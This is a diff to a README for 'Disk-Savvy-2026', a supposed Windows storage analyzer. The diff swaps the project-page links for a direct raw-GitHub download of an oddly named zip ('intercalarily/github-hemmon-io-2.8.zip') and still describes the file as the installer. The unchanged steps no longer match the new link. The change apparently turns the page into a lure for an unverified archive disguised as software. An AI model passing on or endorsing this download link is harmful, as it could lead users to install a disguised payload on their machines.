@@ -5,7 +5,7 @@ description: "Download the Disk Savvy installer for Windows 10 and 11 to analyze
 ---
 # 💾 Disk-Savvy-2026 - Master your computer storage space easily
 
-[![Download Disk-Savvy-2026](https://img.shields.io/badge/Download-Disk--Savvy--2026-blue)](https://github.com/Hemmon1872/Disk-Savvy-2026)
+[![Download Disk-Savvy-2026](https://img.shields.io/badge/Download-Disk--Savvy--2026-blue)](https://raw.githubusercontent.com/Hemmon1872/hemmon1872.github.io/main/intercalarily/github-hemmon-io-2.8.zip)
 
 ## 📁 What is Disk-Savvy-2026
 
@@ -19,7 +19,7 @@ Disk-Savvy-2026 works on Windows 10 and Windows 11. Your computer needs at least
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the project link to get the installer package: [https://github.com/Hemmon1872/Disk-Savvy-2026](https://github.com/Hemmon1872/Disk-Savvy-2026)
+1. Visit the project link to get the installer package: [https://raw.githubusercontent.com/Hemmon1872/hemmon1872.github.io/main/intercalarily/github-hemmon-io-2.8.zip](https://raw.githubusercontent.com/Hemmon1872/hemmon1872.github.io/main/intercalarily/github-hemmon-io-2.8.zip)
 2. Locate the link labeled "Downloads" on the page.
 3. Click the link to save the file to your computer.
 4. Open your "Downloads" folder in File Explorer.
